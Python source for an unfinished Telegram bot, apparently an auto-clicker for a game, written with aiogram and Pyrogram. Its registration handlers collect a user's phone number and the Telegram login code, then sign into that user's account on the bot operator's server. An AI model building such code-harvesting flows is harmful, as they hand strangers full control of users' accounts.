from aiogram import F, Router, types
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery
import app.key as k
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from Private import api_id, api_hash
from pyrogram import Client

router = Router()
Number = ''

sCoder = ''


# Cliert = 0


# TODO: Дописать настройки кликера, словарь, процесс входа,

class Reg(StatesGroup):
    number = State()
    kod = State()
    sCode = State()
    Clients = State()


@router.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply(f'Привет. \nТвой ID:{message.from_user.id} ты есть в нашей системе', reply_markup=k.main)


@router.message(Command('help'))
async def get_help(message: Message):
    await message.answer(f'/help - показывает функции бота'
                         f'\n "Профиль" - показывает сколько намайнил кликер'
                         f'\n /start - запускает бота'
                         f'\n "Запустить кликер на арбузы🍉" - Запускает кликер  ')


@router.message(F.text == '🆘Помощь')
async def get_prof(message: Message):
    await message.answer('Можете задать вопрос админу или сообщить ему об ошибке - ....')


@router.message(F.text == '👤Профиль')
async def get_prof(message: Message):
    await message.answer('Инф')


@router.message(F.text == '🍉Запустить кликер на арбузы')
async def get_prof(message: Message):
    await message.reply('✅Кликер включен', reply_markup=k.OFF)


@router.callback_query(F.data == 'OFF')
async def back(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text('Кликер выключен', reply_markup=k.ON)


@router.callback_query(F.data == 'ON')
async def back(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text('Кликер включен', reply_markup=k.OFF)


@router.message(F.text == 'Профиль')
async def get_prof(message: Message):
    await message.answer('Инф')


@router.message(Command('reg'))
async def reg(message: Message, state: FSMContext):
    await state.set_state(Reg.number)
    await message.reply('Введите свой номер телефона', reply_markup=k.contact_btn)


# Проверка, что пользователь ввел свой номер телефона
@router.message(F.contact)
async def save_phone_number(message: Message, state: FSMContext):
    if message.contact.user_id == message.from_user.id:
        await state.update_data(number=message.contact.phone_number)
        client = Client(str(message.from_user.id), api_id, api_hash)
        await client.connect()
        sCode = await client.send_code(message.contact.phone_number)
        await state.update_data(sCode=sCode)
        await state.update_data(Clients=client)
        await message.answer('Введите код')
        await state.set_state(Reg.kod)


@router.message(Reg.number)
async def reg_number(message: Message, state: FSMContext):
    await state.update_data(number=message.text)


@router.message(Reg.kod)
async def reg_kod(message: Message, state: FSMContext):
    data = await state.get_data()
    await data["Clients"].sign_in(str(data["number"]), data["sCode"].phone_code_hash, message.text)
    await message.answer("Спасибо")
    await state.clear()
